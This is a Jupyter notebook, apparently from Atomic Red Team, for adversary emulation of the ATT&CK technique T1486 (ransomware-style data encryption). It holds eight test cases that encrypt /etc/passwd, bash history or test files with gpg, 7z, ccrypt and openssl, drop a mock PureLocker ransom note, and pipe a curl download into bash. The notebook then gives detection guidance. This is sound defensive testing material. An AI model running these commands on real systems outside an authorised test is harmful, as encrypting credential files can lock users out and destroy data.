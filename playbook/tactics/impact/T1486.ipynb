{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "be56520f",
   "metadata": {},
   "source": "# T1486 - Data Encrypted for Impact\nAdversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1)"
  },
  {
   "cell_type": "markdown",
   "id": "e3e3aef3",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "5b380af1",
   "metadata": {},
   "source": "### Atomic Test #1 - Encrypt files using gpg (FreeBSD/Linux)\nUses gpg to encrypt a file\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: Finds where gpg is located\n\n##### Check Prereq Commands:\n```sh\nwhich_gpg=`which gpg`\n\n```\n##### Get Prereq Commands:\n```sh\n(which pkg && pkg install -y gnupg)||(which yum && yum -y install epel-release gpg)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y gpg)\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1046b71e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "b24c01e8",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\necho \"passwd\" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o /tmp/passwd.gpg -c /etc/passwd\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f290ce0c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "2742676a",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm /tmp/passwd.gpg\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "03d485c7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "645a80a7",
   "metadata": {},
   "source": "### Atomic Test #2 - Encrypt files using 7z (FreeBSD/Linux)\nUses 7z to encrypt a file\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: Finds where 7z is located\n\n##### Check Prereq Commands:\n```sh\nwhich_7z=`which 7z`\n\n```\n##### Get Prereq Commands:\n```sh\n(which pkg && pkg install -y 7-zip)\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2bbbadaf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "2720c9a1",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\n$which_7z a -ppasswd /tmp/passwd.zip /etc/passwd\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5d5585df",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "d9bb8f22",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\n$which_7z e /tmp/passwd.zip\nrm /tmp/passwd.zip\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "64a7f01c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a23650ed",
   "metadata": {},
   "source": "### Atomic Test #3 - Encrypt files using ccrypt (FreeBSD/Linux)\nAttempts to encrypt data on target systems as root to simulate an inturruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Finds where ccencrypt and ccdecrypt is located and copies input file\n\n##### Check Prereq Commands:\n```sh\nwhich_ccencrypt=`which ccencrypt`\nwhich_ccdecrypt=`which ccdecrypt`\nif [ $USER == \"root\" ]; then cp /etc/passwd /tmp/passwd; else cp ~/.bash_history /tmp/passwd; fi\n\n```\n##### Get Prereq Commands:\n```sh\n(which pkg && pkg install -y ccript)||(which yum && yum -y install epel-release ccrypt)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y ccrypt)\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3214798e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "4f404cfa",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nif [ $USER == \"root\" ]; then $which_ccencrypt /etc/passwd; file /etc/passwd.cpt; sudo su; else $which_ccencrypt ~/.bash_history; file ~/.bash_history.cpt; sudo su; fi\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fbf9e732",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "bc3a60d8",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nif [ $USER == \"root\" ]; then mv /tmp/passwd /etc/passwd; else cp /tmp/passwd ~/.bash_history; fi \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fa2e8259",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2110c672",
   "metadata": {},
   "source": "### Atomic Test #4 - Encrypt files using openssl (FreeBSD/Linux)\nUses openssl to encrypt a file\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: Finds where openssl is located\n\n##### Check Prereq Commands:\n```sh\nwhich_openssl=`which openssl`\n\n```\n##### Get Prereq Commands:\n```sh\nNone\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f35d5921",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f2724535",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\n$which_openssl genrsa -out /tmp/key.pem 2048\n$which_openssl rsa -in /tmp/key.pem -pubout -out /tmp/pub.pem\n$which_openssl rsautl -encrypt -inkey /tmp/pub.pem -pubin -in /etc/passwd -out /tmp/passwd.zip\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "89b1eb9a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "2bc61827",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\n$which_openssl rsautl -decrypt -inkey /tmp/key.pem -in /tmp/passwd.zip\nrm /tmp/passwd.zip\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "064c5729",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3af88841",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - PureLocker Ransom Note",
    "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\necho T1486 - Purelocker Ransom Note > %USERPROFILE%\\Desktop\\YOUR_FILES.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7ee11fbe",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "2183a667",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %USERPROFILE%\\Desktop\\YOUR_FILES.txt >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b9f71b34",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5a1d298d",
   "metadata": {},
   "source": "### Atomic Test #6 - Encrypt files using 7z utility - macOS\nThis test encrypts the file(s) using the 7z utility\n\n**Supported Platforms:** macos\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Check if 7z command exists on the machine\n\n##### Check Prereq Commands:\n```sh\nwhich 7z\n\n```\n##### Get Prereq Commands:\n```sh\necho Installing 7z, using brew\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\nbrew install p7zip\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a0afe33a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a41aeab3",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\n7z a -p ARTPass -mhe=on ARTArchive.7z ~/test.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "12263d1a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "4a8a58b1",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm ARTArchive.7z\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c95ccac7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d4b1e5ff",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Encrypt files using openssl utility - macOS",
    "This test encrypts the file(s) using the openssl utility\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nopenssl enc -pbkdf2 -in ~/test.txt -out ARTFile\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2dd66722",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "6f93c8f7",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm ARTFile\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "411e3f3a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "21869075",
   "metadata": {},
   "source": "### Atomic Test #8 - Data Encrypted with GPG4Win\nGpg4win is a Windows tool (also called Kleopatra which is the preferred certificate manager) that uses email and file encryption packages for symmetric encryption. It is used by attackers to encrypt disks. User will need to add pass phrase to encrypt file as automation is not allowed under newer versions.\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: GPG must exist at (#{GPG_Exe_Location})\n\n##### Check Prereq Commands:\n```powershell\nif (test-path 'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe'){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://files.gpg4win.org/gpg4win-4.1.0.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\"\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\" /S\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9db15388",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "87970843",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncmd /c 'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe' -c '$env:temp\\test.txt'\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "44b75c52",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "87cf2233",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nremove-item '$env:temp\\test.txt.gpg' -force -erroraction silentlycontinue | out-null\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e5546077",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1486 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c4cef9b8",
   "metadata": {},
   "source": "## Detection\nUse process monitoring to monitor the execution and command line parameters of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit. Monitor for the creation of suspicious files as well as unusual file modification activity. In particular, look for large quantities of file modifications in user directories.\n\nIn some cases, monitoring for unusual kernel driver installation activity can aid in detection.\n\nIn cloud environments, monitor for events that indicate storage objects have been anomalously replaced by copies."
  },
  {
   "cell_type": "markdown",
   "id": "39474cbe",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### System Activity Monitoring \n Collect system activity logs which can reveal adversary activity. \n\n Capturing system logs can show logins, user and system events, etc.  Collecting this data and potentially sending it to a centralized location can help reveal the presence of an adversary and the actions they perform on a compromised system.\n#### Opportunity\nThere is an opportunity to create a detection with a moderately high probability of success.\n#### Use Case\nA defender can use process monitoring to look for the execution of utilities commonly used for ransomware and other data encryption.\n#### Procedures\nEnsure that systems capture and retain common system level activity artifacts that might be produced.\nMonitor Windows systems for event codes that reflect an adversary changing passwords, adding accounts to groups, etc.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}